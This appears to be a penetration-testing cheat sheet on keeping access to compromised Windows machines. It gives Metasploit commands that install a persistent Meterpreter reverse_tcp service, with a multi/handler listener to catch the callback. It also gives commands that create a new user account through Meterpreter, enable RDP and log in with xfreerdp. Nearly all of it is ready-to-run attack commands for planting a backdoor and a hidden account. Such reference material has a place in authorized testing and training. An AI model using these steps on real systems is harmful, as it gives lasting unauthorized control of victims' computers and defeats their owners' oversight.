# Windows - Persistence

## Automatic Persistence

### Service Persistence

```bash
# Make Persistent a meterpreter session with msf
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set LPORT PERSISTENCE_PORT
set SESSION SESSION
expoit

# Now we can close the session and reopen when we want
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST eth1
set LPORT PERSISTENCE_PORT
run

# The session will open everytime we start a multi/handler listener on PERSISTENCE PORT
```

### RDP Access Persistence

<pre class="language-bash"><code class="lang-bash"><strong># Get a meterpreter session with elevated privs
</strong>
# create a new user via meterpreter 
run getgui -e -u NEW_USER -p PASS

# if rdp is disable, try to enable it
use post/windows/manage/enable_rdp
show options
set SESSION N
exploit

# connect via rdp
xfreerdp /u:NEW_USER /p:PASS /v:IP
</code></pre>
